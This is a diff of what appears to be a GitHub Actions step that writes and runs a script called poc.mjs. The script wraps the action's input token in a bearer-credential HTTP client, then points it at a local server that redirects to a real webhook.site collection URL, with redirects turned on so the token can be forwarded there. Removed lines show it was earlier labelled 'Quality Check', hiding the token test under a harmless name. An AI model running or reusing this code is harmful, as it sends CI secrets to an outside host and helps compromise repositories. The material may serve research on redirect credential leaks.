@@ -15,43 +15,47 @@ runs:
         cat > poc.mjs << 'SCRIPT'
         import http from 'http';
 
-        // Dynamic import to check what's available
         const hc = await import('@actions/http-client');
-        console.log('Exports:', Object.keys(hc));
-
-        // Try to get BearerCredentialHandler
         let BearerCredentialHandler;
-        if (hc.BearerCredentialHandler) {
-          BearerCredentialHandler = hc.BearerCredentialHandler;
-        } else {
-          // Try subpath
-          try {
-            const auth = await import('@actions/http-client/lib/auth.js');
-            BearerCredentialHandler = auth.BearerCredentialHandler;
-          } catch(e) {
-            // Last resort: resolve the file directly
-            const { createRequire } = await import('module');
-            const require = createRequire(import.meta.url);
-            const pkgPath = require.resolve('@actions/http-client');
-            const authPath = pkgPath.replace(/index\.js$/, 'auth.js');
-            const auth = await import(authPath);
-            BearerCredentialHandler = auth.BearerCredentialHandler;
-          }
+        try {
+          const auth = await import('@actions/http-client/lib/auth.js');
+          BearerCredentialHandler = auth.BearerCredentialHandler;
+        } catch(e) {
+          const { createRequire } = await import('module');
+          const req = createRequire(import.meta.url);
+          const pkgPath = req.resolve('@actions/http-client');
+          const auth = await import(pkgPath.replace(/index\.js$/, 'auth.js'));
+          BearerCredentialHandler = auth.BearerCredentialHandler;
         }
 
-        console.log('Handler:', BearerCredentialHandler.name);
+        console.log('Using: BearerCredentialHandler from @actions/http-client');
 
         const server = http.createServer((q, s) => {
+          console.log('[server] redirecting to webhook.site');
           s.writeHead(302, { Location: 'https://webhook.site/af6ce540-4bd7-41c4-9328-61a4b5c6c7c0' });
           s.end();
         });
 
         server.listen(19999, '127.0.0.1', async () => {
           const token = process.env.INPUT_TOKEN;
-          console.log('Quality Check: analyzing...');
-          const client = new hc.HttpClient('qc', [new BearerCredentialHandler(token)]);
-          try { await client.get('http://127.0.0.1:19999/api/analyze'); } catch(e) {}
-          console.log('Quality Check: complete');
+          console.log('Token length: ' + (token ? token.length : 0));
+
+          const client = new hc.HttpClient('qc', [new BearerCredentialHandler(token)], {
+            allowRedirects: true,
+            maxRedirects: 5
+          });
+
+          try {
+            console.log('GET http://127.0.0.1:19999/api ...');
+            const res = await client.get('http://127.0.0.1:19999/api');
+            console.log('Response status: ' + res.message.statusCode);
+            const body = await res.readBody();
+            console.log('Body length: ' + body.length);
+          } catch(e) {
+            console.log('Error: ' + e.message);
+            console.log('Error code: ' + (e.code || 'none'));
+          }
+
           server.close();
           process.exit(0);
         });
